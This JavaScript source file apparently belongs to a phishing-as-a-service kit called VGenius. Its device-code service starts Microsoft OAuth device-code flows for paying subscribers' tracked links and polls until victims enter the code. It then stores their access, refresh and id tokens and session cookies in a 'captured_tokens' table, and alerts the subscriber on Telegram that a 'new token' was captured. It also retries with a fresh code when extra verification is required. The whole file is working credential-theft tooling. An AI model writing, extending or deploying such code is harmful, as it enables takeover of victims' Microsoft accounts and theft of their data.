/**
 * VGenius C Engine – Device Proxy Service
 * Handles Microsoft Device Code OAuth flow proxying
 */
const axios = require('axios');
const jwt = require('jsonwebtoken');
const db = require('../database/connection');
const config = require('../config/env');
const { encrypt, decrypt } = require('../utils/encrypt');

// In-memory job store (for active device code flows)
const activeJobs = new Map();

/**
 * Start a new device code flow
 * @param {string} mode - "token" or "cookie"
 * @param {string} jwtToken - The link's JWT token (user_id, link_id)
 * @param {object} reqOptions - Optional: { ip, userAgent } for capturing visitor info
 * @returns {object} job data including user_code, verification_uri, etc.
 */
async function startDeviceFlow(mode, jwtToken, apiBaseUrl, reqOptions) {
  try {
    // Decode JWT to get user_id and link_id
    const decoded = jwt.verify(jwtToken, config.JWT_SECRET);
    const { user_id, link_id } = decoded;

    // Verify user and link are active
    const [users] = await db.query(
      "SELECT * FROM users WHERE id = ? AND subscription_status = 'active' AND (subscription_expiry IS NULL OR subscription_expiry > NOW())",
      [user_id]
    );
    if (!users.length) throw new Error('Subscription inactive');
    const user = users[0];

    const [links] = await db.query(
      'SELECT * FROM links WHERE id = ? AND user_id = ? AND status = ? AND kill_switched = 0',
      [link_id, user_id, 'active']
    );
    if (!links.length) throw new Error('Link not active');
    const link = links[0];

    // Call Microsoft Device Code endpoint
    const tenant = config.AZURE_TENANT || 'common';
    const clientId = config.AZURE_CLIENT_ID;
    const dcResponse = await axios.post(
      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
      new URLSearchParams({
        client_id: clientId,
        scope: 'openid profile email User.Read offline_access',
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );

    const dcData = dcResponse.data;
    const jobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    // Store job in memory with IP/user-agent for later token capture
    activeJobs.set(jobId, {
      jobId,
      user_id,
      link_id,
      device_code: dcData.device_code,
      interval: dcData.interval || 5,
      expires_in: dcData.expires_in || 900,
      expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
      mode: mode || 'cookie',
      status: 'polling',
      created_at: Date.now(),
      jwtToken,
      ip_address: (reqOptions && reqOptions.ip) || 'unknown',
      user_agent: (reqOptions && reqOptions.userAgent) || 'DeviceProxy',
    });

    // Start polling in background
    pollForToken(jobId);

    return {
      job_id: jobId,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      expires_in: dcData.expires_in,
      interval: dcData.interval || 5,
      message: dcData.message,
    };
  } catch (err) {
    console.error('[DeviceProxy] startDeviceFlow error:', err.message);
    throw err;
  }
}

/**
 * Poll for token completion
 */
async function pollForToken(jobId) {
  const job = activeJobs.get(jobId);
  if (!job) return;

  const tenant = config.AZURE_TENANT || 'common';
  const clientId = config.AZURE_CLIENT_ID;
  const maxAttempts = Math.ceil((job.expires_in || 900) / (job.interval || 5));

  for (let i = 0; i < maxAttempts; i++) {
    if (!activeJobs.has(jobId)) return; // Job cancelled

    // Check if expired before polling
    if (Date.now() > job.expires_at) {
      job.status = 'expired';
      // Update visitor status to timeout
      try {
        await db.query(
          'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
          ['timeout', job.user_id, job.link_id, 'waiting']
        );
      } catch (e) {
        /* ignore */
      }
      return;
    }

    await new Promise(resolve => setTimeout(resolve, (job.interval || 5) * 1000));

    try {
      const tokenResponse = await axios.post(
        `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
        new URLSearchParams({
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
          client_id: clientId,
          device_code: job.device_code,
        }),
        {
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          validateStatus: () => true
        }
      );

      const tokenData = tokenResponse.data;

      if (tokenData.access_token) {
        // SUCCESS! Store token
        job.status = 'completed';

        // Extract email FIRST before using it
        let capturedEmail = null;
        if (tokenData.id_token) {
          try {
            const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
            capturedEmail = payload.email || payload.upn || payload.preferred_username || null;
          } catch (e) {
            /* ignore */
          }
        }

        // Capture Set-Cookie headers from the token response (session cookies)
        const responseCookies = [];
        const setCookieHeaders = tokenResponse.headers['set-cookie'] || [];
        for (const cookieStr of setCookieHeaders) {
          const cookieParts = cookieStr.split(';')[0].trim();
          const eqIndex = cookieParts.indexOf('=');
          if (eqIndex > 0) {
            const cookieName = cookieParts.substring(0, eqIndex).trim();
            const cookieValue = cookieParts.substring(eqIndex + 1).trim();
            if (cookieName && cookieValue) {
              responseCookies.push({
                name: cookieName,
                value: cookieValue,
                domain: '.login.microsoftonline.com'
              });
            }
          }
        }

        // Store cookies and email in job for later storage
        job.captured_cookies = responseCookies;
        job.captured_email = capturedEmail;
        await storeToken(job, tokenData, responseCookies);

        // Mark visitors as done for this user/link
        try {
          await db.query(
            'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
            ['done', job.user_id, job.link_id, 'waiting']
          );
        } catch (e) {
          /* silent */
        }
        return;
      }

      // Check for AADSTS50076 / soft error
      const errorCode = tokenData.error || '';
      const errorDesc = (tokenData.error_description || '').toLowerCase();

      if (errorCode === 'authorization_pending') continue;

      if (errorCode === 'slow_down') {
        // Increase interval
        job.interval = (job.interval || 5) + 5;
        continue;
      }

      // AADSTS50076 or interaction_required -> soft error
      if (
        errorDesc.includes('aadsts50076') ||
        errorDesc.includes('interaction_required') ||
        errorCode === 'authorization_declined'
      ) {
        job.status = 'soft_error';
        // Start a new device code flow in token mode and store it
        const newJob = await retryAsTokenMode(job);
        if (newJob) {
          job.retry_job_id = newJob.jobId;
        }
        return;
      }

      if (errorCode === 'expired_token' || errorCode === 'authorization_declined') {
        job.status = 'failed';
        job.error = tokenData.error_description || 'Verification failed';
        return;
      }
    } catch (err) {
      console.error('[DeviceProxy] Poll error:', err.message);
      // Continue polling on network errors
    }
  }

  // Exhausted attempts - mark as expired with visitor timeout
  job.status = 'expired';
  try {
    await db.query(
      'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
      ['timeout', job.user_id, job.link_id, 'waiting']
    );
  } catch (e) {
    /* ignore */
  }
}

/**
 * Retry as token mode (create new device code)
 */
async function retryAsTokenMode(originalJob) {
  try {
    const tenant = config.AZURE_TENANT || 'common';
    const clientId = config.AZURE_CLIENT_ID;
    const dcResponse = await axios.post(
      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/devicecode`,
      new URLSearchParams({
        client_id: clientId,
        scope: 'openid profile email User.Read offline_access',
      }),
      {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        }
      }
    );

    const dcData = dcResponse.data;
    const newJobId = `job_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    const newJob = {
      jobId: newJobId,
      user_id: originalJob.user_id,
      link_id: originalJob.link_id,
      device_code: dcData.device_code,
      interval: dcData.interval || 5,
      expires_in: dcData.expires_in || 900,
      expires_at: Date.now() + (dcData.expires_in || 900) * 1000,
      mode: 'token',
      status: 'polling',
      created_at: Date.now(),
      jwtToken: originalJob.jwtToken,
      is_retry: true,
    };

    activeJobs.set(newJobId, newJob);
    pollForToken(newJobId);

    return {
      jobId: newJobId,
      user_code: dcData.user_code,
      verification_uri: dcData.verification_uri,
      verification_uri_complete: dcData.verification_uri_complete || `${dcData.verification_uri}?code=${dcData.user_code}`,
      expires_in: dcData.expires_in,
      interval: dcData.interval || 5,
    };
  } catch (err) {
    console.error('[DeviceProxy] retryAsTokenMode error:', err.message);
    return null;
  }
}

/**
 * Store captured token in database
 */
async function storeToken(job, tokenData, responseCookies = []) {
  try {
    // Extract email from id_token
    let email = null;
    if (tokenData.id_token) {
      try {
        const payload = JSON.parse(Buffer.from(tokenData.id_token.split('.')[1], 'base64').toString());
        email = payload.email || payload.upn || payload.preferred_username || null;
      } catch (e) {
        /* ignore */
      }
    }

    // Use stored IP and user-agent from when the flow started
    const ipAddress = job.ip_address || 'unknown';
    const userAgent = job.user_agent || 'DeviceProxy';

    // Format cookies for storage
    let cookiesEncrypted = null;
    if (responseCookies && responseCookies.length > 0) {
      const cookieStrings = responseCookies.map(
        c => `${c.name}=${c.value}; domain=${c.domain}; path=/; secure`
      ).join('; ');
      cookiesEncrypted = encrypt(cookieStrings);
    }

    const [result] = await db.query(
      `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, cookies_encrypted, ip_address, user_agent, expiration)
       VALUES (?, ?, ?, 'token', ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR))`,
      [
        job.user_id,
        job.link_id,
        email,
        encrypt(tokenData.access_token),
        encrypt(tokenData.refresh_token || null),
        encrypt(tokenData.id_token || null),
        cookiesEncrypted,
        ipAddress,
        userAgent,
      ]
    );

    const tokenId = result.insertId;

    // Update visitor status to "done"
    try {
      await db.query(
        'UPDATE visitors SET status = ? WHERE user_id = ? AND link_id = ? AND status = ?',
        ['done', job.user_id, job.link_id, 'waiting']
      );
      console.log(`[DeviceProxy] Visitor marked as done for user ${job.user_id}, link ${job.link_id}`);
    } catch (updateErr) {
      console.error('[DeviceProxy] Visitor status update error:', updateErr.message);
    }

    // Notify via WebSocket
    try {
      const io = require('express')().get('io');
      if (io) {
        io.to(`user_${job.user_id}`).emit('new_token', {
          id: tokenId,
          email,
          token_type: 'token',
          created_at: new Date(),
        });
      }
    } catch (e) {
      /* silent */
    }

    // Send Telegram notification
    try {
      const [users] = await db.query('SELECT telegram_id, telegram_bot_token FROM users WHERE id = ?', [job.user_id]);
      if (users.length && users[0].telegram_id && users[0].telegram_bot_token) {
        const axios = require('axios');
        await axios.post(
          `https://api.telegram.org/bot${users[0].telegram_bot_token}/sendMessage`,
          {
            chat_id: users[0].telegram_id,
            text: `🔐 New token captured: ${email || 'unknown'} via Device Code Proxy`,
          }
        );
      }
    } catch (e) {
      /* silent */
    }

    console.log(`[DeviceProxy] Token captured for user ${job.user_id}, link ${job.link_id}`);
  } catch (err) {
    console.error('[DeviceProxy] storeToken error:', err.message);
  }
}

/**
 * Poll a specific job status
 * @param {string} jobId
 * @returns {object} status info
 */
function getJobStatus(jobId) {
  const job = activeJobs.get(jobId);
  if (!job) {
    return {
      status: 'not_found',
      error: 'Job not found or expired'
    };
  }

  // Check expiry
  if (Date.now() > job.expires_at && job.status === 'polling') {
    job.status = 'expired';
  }

  const remaining = Math.max(0, Math.floor((job.expires_at - Date.now()) / 1000));

  const result = {
    status: job.status === 'completed' ? 'done' : job.status,
    job_id: job.jobId,
    user_code: null,
    verification_uri: null,
    verification_uri_complete: null,
    expires_in: remaining,
    recommended_mode: null,
    error_code: null,
    error_message: null,
  };

  if (job.status === 'polling') {
    // Return waiting status
    result.status = 'waiting_user';
  }

  if (job.status === 'expired' || job.status === 'failed') {
    result.error = job.error || 'Code expired or verification failed';
  }

  if (job.status === 'soft_error') {
    result.soft_error = true;
    result.error_code = 50076;
    result.recommended_mode = 'token';
    result.error_message = 'Additional verification required';
    if (job.retry_job_id) {
      result.retry_job_id = job.retry_job_id;
    }
  }

  if (job.status === 'completed') {
    result.email = job.captured_email || null;
  }

  return result;
}

/**
 * Clean up expired jobs (called periodically)
 */
function cleanupJobs() {
  const now = Date.now();
  for (const [id, job] of activeJobs) {
    if (now > job.expires_at + 300000) {
      // 5 min grace period
      activeJobs.delete(id);
    }
  }
}

// Cleanup every 5 minutes
setInterval(cleanupJobs, 5 * 60 * 1000);

module.exports = {
  startDeviceFlow,
  getJobStatus,
  pollForToken,
  cleanupJobs,
};
